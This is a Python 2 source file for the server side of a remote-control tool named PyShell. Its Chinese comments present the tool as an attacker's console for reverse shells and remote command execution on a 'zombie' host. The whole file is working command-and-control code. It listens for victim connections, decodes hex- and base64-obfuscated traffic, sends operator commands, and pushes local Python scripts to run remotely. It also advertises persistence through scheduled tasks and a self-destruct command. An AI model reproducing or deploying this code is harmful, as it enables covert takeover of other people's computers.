#!/usr/bin/env python
# -*- coding:utf-8 -*-

'''
PyShell
PyShell主要用于建立TCP连接，反弹Shell，远程执行命令
其中Server端为攻击机（远程发送命令），Client端为被控端（接收命令并执行）

'''

import socket
import base64
import sys
import binascii
import os
import re
import threading
import time
from StringIO import StringIO

class servers:

	""" Server of PyShell

		PyShell服务端代码类

	"""
	def __init__(self,server_address):
		self.server_address=server_address
		self.main()

	def connec(self):
		"""
		配置监听参数，包括ip地址，port号，最大链接数量等。
		"""
		try:
			self.server=socket.socket(socket.AF_INET,socket.SOCK_STREAM) #TCP套接字
			self.server.bind(self.server_address) #ip:port
			self.server.listen(10)	#设置最大连接数
			print "[*]Listening on %s:%d" % (self.server_address[0],self.server_address[1])
		except:
			print u'参数填写有误,或者该端口已被占用！'

	def handle_client(self):
			'''
			从客户端接收数据，并处理。
			'''
			request=self.client.recv(409600)  #服务器端每次接收的最大数据

			request=base64.b64decode(binascii.a2b_hex(request.strip())).split('*') #将接收到的数据进行解码
			print request[0]   #输出接收到的数据
			
			path=request[1]
			contents=raw_input(path+'>')  #返回当前路径

			i='-p'
			if i in contents:
				lists=contents.split(' ')
				filename=lists[2]
				f=open(filename).read()
				contents='-p'+f

			contents_j=binascii.b2a_hex(base64.b64encode(contents)) #将要发送的数据加码
			self.client.send(contents_j+' ') #发送数据
			self.client.close()

			if contents=='kill' or contents=='exit':
				time.sleep(5)
				sys.exit()
	
	def main(self):
		self.connec() #执行连接函数
		while True:
			'''
			循环接收客户端信息
			'''
			try:
				self.client,self.addr=self.server.accept()  #接收到客户端数据对象，保存到client中，addr中的为客户端ip与端口号
				self.handle_client()   #执行接收发送数据函数
			except:
				sys.exit()

def mains():
	'''
	从控制台接收参数，执行相应的代码（Server）
	'''
	if len(sys.argv)>2:
		ip=str(sys.argv[1])
		port=int(sys.argv[2])

		address_all=(ip,port)
		servers(address_all)
		print '[HELP]  PyShell.exe [ip] [port]'
		print '[HELP]  python PyShellServer.py [ip] [port]'
		print u'connection：'
		print u'[HELP]  exit    ----退出连接'
		print u'[HELP]  kill    ----退出连接并自毁程序'
		print u'[HELP]  playtask    ----创建计划任务'
		print u'[HELP]  python -p file.py    ----在肉鸡上执行本地python脚本'
	else:
		print '[HELP]  PyShell.exe [ip] [port]'
		print '[HELP]  python PyShellServer.py [ip] [port]'
		print u'connection：'
		print u'[HELP]  exit    ----退出连接'
		print u'[HELP]  kill    ----退出连接并自毁程序'
		print u'[HELP]  playtask    ----创建计划任务'
		print u'[HELP]  python -p file.py    ----在肉鸡上执行本地python脚本'

if __name__=='__main__':
	mains()
